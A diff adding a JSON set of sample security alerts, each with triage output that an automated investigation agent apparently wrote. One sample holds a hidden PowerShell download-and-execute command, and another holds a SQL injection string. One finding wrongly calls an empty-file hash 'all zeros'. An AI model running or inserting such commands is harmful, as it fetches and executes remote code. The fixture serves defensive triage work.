@@ -1,0 +1,377 @@
+[
+  {
+    "raw": "CEF:0|Palo Alto Networks|PAN-OS|10.1.2|dns-query-blocked|DNS Query Blocked|5|src=192.168.1.105 dst=8.8.8.8 dhost=malware.c2.net proto=udp dpt=53 cs1Label=QueryType cs1=A",
+    "routing": {
+      "alert_class": "malware",
+      "rationale": "DNS query to a known malware command and control domain (malware.c2.net) indicates potential malware beaconing or C2 communication attempt.",
+      "confidence": 0.85
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1071.004",
+          "name": "DNS",
+          "tactics": [
+            "Command and Control"
+          ],
+          "why_relevant": "The alert shows a DNS query to a known malware C2 domain (malware.c2.net), which directly aligns with DNS-based command and control and potential DNS beaconing tactics used by malware to communicate covertly with remote attackers."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "A host at 192.168.1.105 attempted a DNS query to a known malware C2 domain (malware.c2.net), which was blocked by Palo Alto Networks. This activity is consistent with malware beaconing or establishing command and control communication via DNS tunneling. The query is an A record lookup indicating potential malware attempting to resolve the C2 server's IP address for callback or instruction delivery.",
+      "severity": "high",
+      "severity_rationale": "This alert indicates active malware C2 communication or beaconing activity, which is a post-compromise indicator of a live threat. The blocking of a known malware domain prevents immediate compromise escalation, but the presence of the query itself confirms infection or malware execution on the host. The severity is elevated because it demonstrates active adversary communication attempts and reflects the latter stages of the attack chain.",
+      "confidence": 0.92,
+      "recommended_response": "Immediately isolate host 192.168.1.105 from the network to prevent further C2 communication. Conduct a full endpoint investigation including process execution analysis, memory forensics, and file system scanning to identify the malware payload and entry point. Quarantine the host, capture memory/disk for forensic analysis, and check for lateral movement indicators. Review network logs for any successful C2 communication prior to the blocking rule being applied. Coordinate with IR team to determine infection vector and perform broad threat hunting across similar systems.",
+      "rounds_used": 6
+    }
+  },
+  {
+    "raw": "2024-01-15T09:23:47Z ubuntu sshd[4521]: Failed password for invalid user admin from 203.0.113.42 port 54832 ssh2",
+    "routing": {
+      "alert_class": "identity_auth",
+      "rationale": "This alert indicates a failed SSH login attempt for a non-existent user from a remote IP address, which is a credential/authentication event.",
+      "confidence": 0.95
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1110",
+          "name": "Brute Force",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The SSH login attempt against an invalid user is consistent with brute-force reconnaissance activity, where attackers attempt to guess credentials without prior knowledge of valid accounts."
+        },
+        {
+          "id": "T1110.001",
+          "name": "Password Guessing",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The failed SSH password attempt for the non-existent 'admin' user directly matches password guessing behavior targeting commonly used usernames via SSH on port 22."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "A single failed SSH login attempt was made from external IP 203.0.113.42 against a non-existent 'admin' user on the target system. While this event itself is isolated, it represents opportunistic credential guessing activity targeting SSH, a common initial access vector. No user account was involved in this attempt since the target user does not exist on the system.",
+      "severity": "low",
+      "severity_rationale": "This is an isolated failed login attempt against a non-existent user account, which does not represent an immediate security breach. However, it demonstrates active reconnaissance and password guessing targeting the SSH service. The low severity reflects that: (1) the attempt failed, (2) the target user doesn't exist, (3) no legitimate account was compromised, and (4) this is typical background noise on internet-facing SSH services. Elevated only if part of a sustained campaign.",
+      "confidence": 0.85,
+      "recommended_response": "(1) Review SSH logs for frequency and patterns\u2014if multiple failed attempts from the same or similar IPs are observed over time, implement rate limiting or IP-based access controls. (2) Consider disallowing root/admin login via SSH and enforce key-based authentication. (3) Monitor for any successful breaches of valid accounts. (4) If this is part of a broader attack pattern, consider implementing fail2ban or similar intrusion prevention to block repeat offenders.",
+      "rounds_used": 3
+    }
+  },
+  {
+    "raw": "{\"timestamp\":\"2024-01-15T09:45:12Z\",\"source\":\"crowdstrike_falcon\",\"event_type\":\"process_execution\",\"hostname\":\"WORKSTATION-07\",\"username\":\"jsmith\",\"process_name\":\"powershell.exe\",\"command_line\":\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.50/payload')\",\"process_id\":5428,\"parent_process\":\"explorer.exe\",\"file_hash\":\"SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"severity\":\"high\"}",
+    "routing": {
+      "alert_class": "malware",
+      "rationale": "CrowdStrike Falcon detected a PowerShell process executing with obfuscation and remote payload download techniques, which are classic indicators of malware execution.",
+      "confidence": 0.95
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1059.001",
+          "name": "PowerShell",
+          "tactics": [
+            "Execution"
+          ],
+          "why_relevant": "The alert shows direct PowerShell.exe invocation with execution policy bypass and hidden window flags, which is a primary execution vector used by adversaries for malware delivery and command execution."
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer",
+          "tactics": [
+            "Command and Control"
+          ],
+          "why_relevant": "The command line explicitly downloads a remote payload using Net.WebClient.DownloadString() from http://10.0.0.50/payload, which matches the ingress tool transfer pattern for fetching malware from an external source."
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information",
+          "tactics": [
+            "Stealth"
+          ],
+          "why_relevant": "The PowerShell command uses multiple obfuscation flags (-NoP -NonI -W Hidden -Exec Bypass) and IEX (Invoke-Expression) to execute downloaded code in memory, avoiding detection and file-based artifacts."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "CrowdStrike Falcon detected a PowerShell process with classic malware execution indicators: hidden execution, execution policy bypass, and immediate remote payload download from an internal IP address (10.0.0.50). The combination of obfuscation parameters (-NoP -NonI -W Hidden -Exec Bypass) and IEX pipe usage for in-memory code execution indicates deliberate evasion. Auth logs show no activity for user jsmith during the lookback period, suggesting either a dormant account or credential compromise.",
+      "severity": "critical",
+      "severity_rationale": "This alert exhibits multiple high-confidence malware execution signals: (1) obfuscated PowerShell with execution policy bypass, (2) remote payload download via HTTP from a suspicious internal IP, (3) in-memory code execution via IEX to avoid disk artifacts, and (4) hidden window execution. The combination of these TTPs is highly indicative of active malware deployment, not a legitimate administrative action. The file hash (all zeros) and parent process (explorer.exe) further suggest injection or user-initiated compromise.",
+      "confidence": 0.95,
+      "recommended_response": "Immediately isolate WORKSTATION-07 from the network and initiate forensic capture of volatile memory to recover the downloaded payload before execution spreads. Kill the PowerShell process (PID 5428) and block http://10.0.0.50 at the perimeter. Query jsmith's account for recent unauthorized access, password changes, or MFA bypass. Hunt for similar PowerShell execution patterns across the environment using the same command-line signatures. Analyze parent process (explorer.exe) for injection or spawning anomalies. Escalate to incident response for potential lateral movement investigation and credential remediation.",
+      "rounds_used": 5
+    }
+  },
+  {
+    "raw": "timestamp=1705316712 severity=warning action=blocked protocol=https src_ip=10.20.30.140 src_port=49152 dst_ip=142.251.41.14 dst_port=443 rule_id=WAF-SQL-001 reason=\"SQL Injection Attempt Detected\" payload_sample=\"' OR '1'='1\" user_agent=\"Mozilla/5.0\" request_method=POST",
+    "routing": {
+      "alert_class": "network",
+      "rationale": "A WAF (Web Application Firewall) detected and blocked a SQL injection attempt in an HTTPS request, which is a network-based security event involving protocol analysis and intrusion prevention.",
+      "confidence": 0.85
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "tactics": [
+            "Initial Access"
+          ],
+          "why_relevant": "The SQL injection attempt in an HTTPS request represents an effort to exploit a public-facing web application to gain unauthorized access or compromise backend databases."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "A WAF detected and blocked a SQL injection attempt (payload: ' OR '1'='1) in an HTTPS POST request from internal IP 10.20.30.140 to external destination 142.251.41.14:443. The attack was successfully prevented by rule WAF-SQL-001, indicating the security control is functioning properly. No follow-on compromise or lateral movement is evident from this blocked request alone.",
+      "severity": "medium",
+      "severity_rationale": "The attack was detected and blocked by existing WAF controls, eliminating immediate exploitation risk. However, the presence of a SQL injection attempt indicates active probing or attack against the organization's web application layer, warranting investigation into the source and intent. The severity is not low because SQL injection remains a critical vulnerability if successfully exploited, and not critical because containment was effective.",
+      "confidence": 0.85,
+      "recommended_response": "Investigate the source IP 10.20.30.140 to determine if it is authorized to access this application and whether this represents an external attacker or an internal user. Review WAF logs for additional SQL injection attempts from this or other sources within the past 24-48 hours. Confirm the patching status and security configuration of the targeted web application. If the source is an external attacker, coordinate with network team to implement additional egress filtering or rate limiting. Consider alerting the application owner to review database credentials and access controls.",
+      "rounds_used": 3
+    }
+  },
+  {
+    "raw": "Jan 15 10:12:33 firewall-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=08:00:27:00:00:00:08:00:27:00:00:01:08:00 SRC=198.51.100.89 DST=172.16.0.50 PROTO=TCP SPT=45123 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0",
+    "routing": {
+      "alert_class": "network",
+      "rationale": "A firewall rule blocked an inbound TCP connection attempt to SSH port 22 from an external IP, which is a typical network-based intrusion detection signal.",
+      "confidence": 0.95
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1110.001",
+          "name": "Password Guessing",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "An external source attempted to connect to SSH port 22 on the target host, which is a common vector for password guessing attacks against remote administrative services."
+        },
+        {
+          "id": "T1110",
+          "name": "Brute Force",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The inbound connection attempt to SSH (port 22) from an external IP represents typical reconnaissance or initial brute force activity targeting remote administrative credentials."
+        },
+        {
+          "id": "T1133",
+          "name": "External Remote Services",
+          "tactics": [
+            "Persistence",
+            "Initial Access"
+          ],
+          "why_relevant": "SSH on port 22 is an external-facing remote service commonly exploited by adversaries for initial access or persistence, and this alert captures an attempted inbound connection to that service."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "An external host (198.51.100.89) attempted to establish an inbound TCP connection to SSH (port 22) on internal host 172.16.0.50, which was blocked by the firewall UFW rule. This single SYN packet represents a typical reconnaissance or brute force attempt targeting the SSH service; however, without visibility into repeated attempts or authentication logs, the threat level remains moderate. The firewall blocking rule is functioning as designed.",
+      "severity": "medium",
+      "severity_rationale": "While this represents a common initial reconnaissance/attack pattern against SSH, the alert captures only a single blocked connection attempt. The firewall's UFW rule successfully prevented the connection, limiting immediate risk. However, multiple similar attempts could indicate a sustained brute force campaign, which would warrant escalation. The absence of successful authentication or multiple attempts keeps this at medium rather than high/critical.",
+      "confidence": 0.72,
+      "recommended_response": "1. Monitor for repeated connection attempts from the same or related external IPs to port 22 over the next 24\u201348 hours. 2. Review firewall logs to determine whether this is part of a broader scanning campaign. 3. Verify that SSH is hardened with key-based authentication, non-default port binding (if feasible), and rate-limiting rules to mitigate brute force risk. 4. If this IP has a known malicious reputation, add it to a deny-list; otherwise, consider geographic or threat intelligence-based filtering if applicable. 5. Ensure alert tuning prevents noise from isolated scanning attempts while maintaining detection of sustained attacks.",
+      "rounds_used": 4
+    }
+  },
+  {
+    "raw": "{\"event_id\":\"EVT-789456\",\"timestamp\":\"2024-01-15T10:35:20Z\",\"alert_name\":\"Suspicious Registry Modification\",\"sensor\":\"EDR-AGENT-023\",\"host\":\"DC01.corp.local\",\"user\":\"CORP\\administrator\",\"registry_path\":\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\"value_name\":\"SecurityUpdate\",\"value_data\":\"C:\\Windows\\Temp\\update.exe\",\"action\":\"modified\",\"registry_hash\":\"MD5:5d41402abc4b2a76b9719d911017c592\"}",
+    "routing": {
+      "alert_class": "malware",
+      "rationale": "Suspicious registry modification in Windows Run key with executable in temp directory is a classic malware persistence technique detected by EDR.",
+      "confidence": 0.85
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "tactics": [
+            "Persistence",
+            "Privilege Escalation"
+          ],
+          "why_relevant": "The alert shows a direct modification of HKLM\\\\ Run key to add a registry entry pointing to an executable, which is textbook Registry Run Key persistence."
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry",
+          "tactics": [
+            "Defense Impairment",
+            "Persistence"
+          ],
+          "why_relevant": "The suspicious registry modification event itself, including adding malicious entries to achieve persistence, aligns with the Modify Registry technique."
+        }
+      ],
+      "identity_signals": {
+        "impossible_travel": false,
+        "mfa_fatigue": false,
+        "privilege_escalation": false,
+        "dormant_account_reactivation": false,
+        "notes": "Administrator account showed no authentication activity in the past 336 hours, which is unusual for an active DC admin account. The registry modification was applied but no recent user login was detected, suggesting automated/system-level malware execution or persistence mechanism already in place."
+      },
+      "key_findings": "An adversary or malware has modified the HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run registry key to persist by adding a reference to 'C:\\\\Windows\\\\Temp\\\\update.exe' with the value name 'SecurityUpdate', masquerading as a legitimate system update. The binary location in the temp directory is a classic malware staging area and does not represent a legitimate Windows system executable. The lack of recent authentication activity on the administrator account combined with this system-level persistence modification suggests either advanced malware already resident on the DC or domain-level credential compromise.",
+      "severity": "critical",
+      "severity_rationale": "This alert indicates active malware persistence on a Domain Controller\u2014the most critical asset in any Windows environment. Registry Run key modifications are a hallmark of post-exploitation persistence, the malware is disguised as a system update (deception), and it resides in Temp (non-standard location). Domain Controllers control authentication, delegation, and access for all domain resources. Compromise of DC01 enables lateral movement, privilege escalation, and potential domain-wide security collapse.",
+      "confidence": 0.92,
+      "recommended_response": "Immediate response: (1) Isolate DC01 from the network immediately while preserving forensic evidence; (2) Force-disable the registry Run key value using GPO or direct registry modification; (3) Locate and quarantine C:\\\\Windows\\\\Temp\\\\update.exe for forensic analysis and hash verification against known malware databases; (4) Initiate a forensic investigation of DC01 including memory dump, event logs (especially 4688, 4720, 5136), and file system timeline to determine malware entry vector and persistence mechanisms; (5) Assume domain compromise and initiate incident response: reset KRBTGT password twice, review user accounts and group memberships, force password resets for all administrative accounts, and review all domain replication and auth activity for lateral movement; (6) Engage threat intelligence and analyze the MD5 hash (5d41402abc4b2a76b9719d911017c592) for known malware signatures; (7) Monitor all other domain controllers for similar persistence mechanisms.",
+      "rounds_used": 4
+    }
+  },
+  {
+    "raw": "src=172.31.45.60 dst=10.0.0.1 proto=TCP dpt=3389 spt=52341 action=DENY signature_id=2019338 threat_category=Lateral Movement threat_name=RDP Brute Force Attack attempts=47 time_window=120s severity=critical",
+    "routing": {
+      "alert_class": "identity_auth",
+      "rationale": "This alert detects an RDP brute force attack with 47 login attempts in 120 seconds, which is a credential-based attack targeting authentication mechanisms.",
+      "confidence": 0.92
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1110.001",
+          "name": "Password Guessing",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The RDP brute force attack with 47 login attempts in 120 seconds is a classic password guessing attack against RDP port 3389."
+        },
+        {
+          "id": "T1110",
+          "name": "Brute Force",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "47 rapid failed authentication attempts against RDP indicate a systematic brute force attack attempting to guess valid credentials."
+        },
+        {
+          "id": "T1021.001",
+          "name": "Remote Desktop Protocol",
+          "tactics": [
+            "Lateral Movement"
+          ],
+          "why_relevant": "The attack is targeted at RDP (port 3389), and if successful, would enable lateral movement and remote system access."
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts",
+          "tactics": [
+            "Stealth",
+            "Persistence",
+            "Privilege Escalation",
+            "Initial Access"
+          ],
+          "why_relevant": "The attacker is attempting to obtain valid account credentials through brute force to abuse legitimate accounts for unauthorized access."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "This alert represents a clear brute force attack against RDP port 3389, with 47 login attempts originating from source IP 172.31.45.60 attempting to access a target at 10.0.0.1 within 120 seconds. The attack was blocked by the network firewall, preventing unauthorized access. No legitimate user behavior is involved\u2014this is an external lateral movement attack attempting to gain credentials through systematic password guessing.",
+      "severity": "high",
+      "severity_rationale": "While the attack was successfully denied and blocked by network controls, brute force attacks against RDP represent a serious threat. The attack demonstrates attacker intent to obtain valid credentials and move laterally within the network. However, severity is 'high' rather than 'critical' because: (1) the attack was blocked by firewall rules, (2) no actual credential compromise is evident, and (3) there is no indication the attacker gained access. The initial alert severity was elevated due to lateral movement classification, but this is a blocked external attack rather than a successful breach.",
+      "confidence": 0.95,
+      "recommended_response": "1. Verify the firewall rule blocking RDP access from 172.31.45.60 is still in place. 2. Investigate the source IP 172.31.45.60 to determine if it is part of a known attack campaign or botnet. 3. Review RDP access controls and ensure Network Level Authentication (NLA) and MFA are enabled on 10.0.0.1. 4. Monitor for any successful RDP authentications or additional brute force attempts from this or similar source IPs. 5. Consider geo-blocking or IP reputation services if the source IP is confirmed malicious. 6. Ensure RDP service is only exposed to trusted networks and disable it if not required.",
+      "rounds_used": 4
+    }
+  },
+  {
+    "raw": "2024-01-15T11:02:54.237Z moto-siem INFO Authentication failure for user kchen from source 203.0.113.178 - Account lockout threshold reached after 5 failed attempts in 10 minutes",
+    "routing": {
+      "alert_class": "identity_auth",
+      "rationale": "Multiple failed authentication attempts resulting in account lockout indicates a potential brute force attack or credential compromise.",
+      "confidence": 0.95
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1110",
+          "name": "Brute Force",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The rapid sequence of 5 failed authentication attempts within 10 minutes is a classic brute-force password-guessing attack pattern targeting the kchen account."
+        },
+        {
+          "id": "T1110.001",
+          "name": "Password Guessing",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The alert describes systematic failed authentication attempts consistent with adversaries attempting to guess the password for account kchen without prior knowledge of valid credentials."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "Failed authentication attempts for user kchen from source 203.0.113.178 resulted in account lockout after 5 failed attempts within 10 minutes. Query of auth logs revealed no activity in the past 2 weeks, suggesting either a dormant account or initial attack on a low-activity user. The attack pattern is consistent with automated brute-force or password-guessing tactics.",
+      "severity": "medium",
+      "severity_rationale": "While the account lockout mechanism successfully prevented further immediate compromise attempts, the adversary has demonstrated active reconnaissance and credential-guessing capability against this specific account. The lack of successful authentication limits the severity to medium, but the attack warrants urgent investigation to determine if other accounts are targeted and to assess the source IP's intent and geographic origin.",
+      "confidence": 0.8,
+      "recommended_response": "1. Immediately verify the source IP (203.0.113.178) for legitimacy; check if it aligns with corporate VPN or known user locations. 2. Contact user kchen to confirm they did not initiate these login attempts and assess credential compromise risk. 3. Force a password reset for kchen and require MFA re-enrollment. 4. Monitor for similar brute-force patterns against other accounts from the same source IP. 5. If kchen's account was dormant, conduct a post-incident review to ensure credentials were not exposed in prior breaches. 6. Block or rate-limit further attempts from 203.0.113.178 at the authentication layer.",
+      "rounds_used": 3
+    }
+  },
+  {
+    "raw": "CEF:0|Cloudflare|WAF|2024.01|malicious_bot|Bot Traffic Detected|7|src=45.33.32.156 cs1Label=BotScore cs1=92 cs2Label=BotManagement cs2=Suspicious cn1Label=http_response_code cn1=403 request=GET /admin/login.php HTTP/1.1 msg=Challenge Required",
+    "routing": {
+      "alert_class": "network",
+      "rationale": "This is a Web Application Firewall (WAF) detection of suspicious bot traffic attempting to access an admin login endpoint, which represents a network-level threat.",
+      "confidence": 0.85
+    },
+    "investigation": {
+      "attack_techniques": [
+        {
+          "id": "T1110",
+          "name": "Brute Force",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The bot traffic with a high suspicion score (92/100) targeting an admin login endpoint is consistent with automated brute force or credential stuffing attacks attempting to gain unauthorized access."
+        },
+        {
+          "id": "T1110.004",
+          "name": "Credential Stuffing",
+          "tactics": [
+            "Credential Access"
+          ],
+          "why_relevant": "The automated bot activity targeting a web-accessible login endpoint matches the pattern of credential stuffing attacks that use previously compromised username-password combinations at scale."
+        },
+        {
+          "id": "T1595.002",
+          "name": "Vulnerability Scanning",
+          "tactics": [
+            "Reconnaissance"
+          ],
+          "why_relevant": "The automated bot probe of the admin login endpoint represents reconnaissance or enumeration activity to identify valid endpoints and application architecture for potential exploitation."
+        }
+      ],
+      "identity_signals": null,
+      "key_findings": "Cloudflare WAF detected malicious bot traffic (BotScore: 92/100) from IP 45.33.32.156 attempting to access /admin/login.php, triggering a 403 Challenge Required response. The high bot score and targeting of an admin login endpoint indicate automated credential attack activity rather than legitimate user traffic. No user identity is involved in this network-layer detection.",
+      "severity": "high",
+      "severity_rationale": "This alert represents a confirmed active attack attempt against an authentication endpoint. The combination of (1) high bot-confidence score (92/100), (2) targeting of a sensitive admin login path, and (3) WAF blocking with challenge response indicates focused malicious automation. While the WAF successfully blocked the attempt, the attacker has already probed the application and may continue or escalate tactics. This is elevated to 'high' rather than 'critical' because the attack was contained by WAF controls and does not indicate successful breach.",
+      "confidence": 0.85,
+      "recommended_response": "1) Monitor the source IP 45.33.32.156 and ASN for additional attack patterns across all externally-facing services. 2) Review WAF logs for any successful bypasses or credential stuffing campaigns from this or related IP ranges over the past 7 days. 3) Enable rate limiting and geo-blocking if appropriate for the /admin/login.php endpoint. 4) Implement or strengthen account lockout policies and MFA enforcement on admin accounts to mitigate credential compromise risk. 5) Consider temporary IP-level blocking or throttling if the attacks persist. 6) Correlate with threat intelligence feeds to determine if this is part of a broader campaign.",
+      "rounds_used": 7
+    }
+  },
+  {
+    "raw": "{\"log_source\":\"Microsoft-Windows-Security-Auditing\",\"event_code\":4688,\"timestamp\":\"2024-01-15T11:45:18Z\",\"computer\":\"LAPTOP-ABC123XY\",\"subject_user_id\":\"S-1-5-21-3623811015-3361044348-30300820-1013\",\"subject_user_name\":\"dthompson\",\"process_information_new_process_id\":\"0x15f4\",\"process_information_new_process_name\":\"C:\\Program Files\\7-Zip\\7z.exe\",\"process_information_creator_process_id\":\"0x1ab8\",\"process_information_creator_process_name\":\"C:\\Windows\\explorer.exe\",\"mandatory_label\":\"S-1-16-8192\"}",
+    "routing": {
+      "alert_class": "other",
+      "rationale": "Process creation event for legitimate 7-Zip archiving utility launched by Windows Explorer, which does not directly indicate identity compromise, malware activity, network intrusion, or phishing.",
+      "confidence": 0.85
+    },
+    "investigation": {
+      "attack_techniques": [],
+      "identity_signals": {
+        "impossible_travel": false,
+        "mfa_fatigue": false,
+        "privilege_escalation": false,
+        "dormant_account_reactivation": false,
+        "notes": "No authentication activity detected in the past 336 hours. The process execution itself does not indicate identity compromise or anomalous login patterns."
+      },
+      "key_findings": "A Windows process creation event (4688) logged user dthompson launching 7-Zip archiving utility (7z.exe) from Windows Explorer at 2024-01-15 11:45:18 UTC. The event shows normal parent-child process relationship and is associated with a medium integrity level. No suspicious authentication activity or behavioral anomalies were identified during the investigation period.",
+      "severity": "low",
+      "severity_rationale": "7-Zip is a legitimate, commonly-used compression utility. The process was launched interactively from Windows Explorer (normal user action), exhibits expected parent-child process chain, runs at medium integrity (not elevated), and shows no signature of compromise, exfiltration, or credential abuse. The routing rationale correctly classified this as non-security-critical: it falls outside identity compromise, malware, intrusion, or phishing classes. Without context indicating data exfiltration, forbidden archival, or other policy violations, this represents normal user activity.",
+      "confidence": 0.85,
+      "recommended_response": "No immediate action required. Archive tool usage is benign in isolation. If organizational policy prohibits 7-Zip or compression tools, escalate to endpoint management for review. Recommend correlating with user file access telemetry and egress traffic monitoring if there are concerns about unauthorized data staging, but current evidence does not support security incident designation.",
+      "rounds_used": 6
+    }
+  }
+]
